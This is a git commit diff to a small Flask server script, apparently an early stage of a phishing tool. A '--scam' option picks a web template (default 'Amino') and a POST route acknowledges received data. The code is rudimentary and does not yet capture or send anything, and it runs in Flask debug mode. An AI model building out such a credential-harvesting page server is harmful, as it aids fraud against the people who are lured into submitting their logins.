d297f344be92aa03edb22a4640aa563d3a2645aa
Neo TRAN <neo_tran@outlook.com>
2020-06-10 12:08:53 -0500

    Se ha puesto el puerto que el usuario ha ingresado

--- scripts/server.py
+++ scripts/server.py
@@ -1,18 +1,36 @@
 from flask import Flask
 import click
 
-app = Flask(__name__)
+# The server class has been created; otherwise, when passing the template, 
+# it only loads the initial value None, which gives the problem that it doesn't take the flag.
+# In this way, we pass when initializing the object, the value of the flag, which forces 
+# us to take the name of the template and thus define the html path.
+class Server:
 
-@app.route('/')
-def index():
-    return 'Index'
+    template = None # Name of the te    mplate to be displayed
+    app = Flask(__name__) # Initialize flask project
 
-@click.command()
-@click.option("--scam", '-s', default="None" , 
-                help="Web template name.   \033[92mpython3 server.py -s Name\033[0m")
-def main(scam):
-    print(scam)
-    app.run(debug=True)
+    # default constructor:
+    # Global is used instead of self because in the paths there 
+    # can be no parameter that does not come by url, giving a conflict when trying to use self.
+    def __init__(self, scam):
+        global template 
+        template = scam
+
+    @app.route('/', methods=['GET'])
+    def index():
+        global template
+        return  template
+
+    @app.route('/', methods=['POST'])
+    def data():
+        return 'Han llegado los datos!!'
+
+@click.command() # Initialize flag values
+@click.option("--scam",  '-s', default="Amino")
+@click.option("--port",  '-p', default="5000"  )
+def main(scam, port):
+    Server(scam).app.run(debug=True, port=port)
 
 if __name__ == '__main__':
     main()
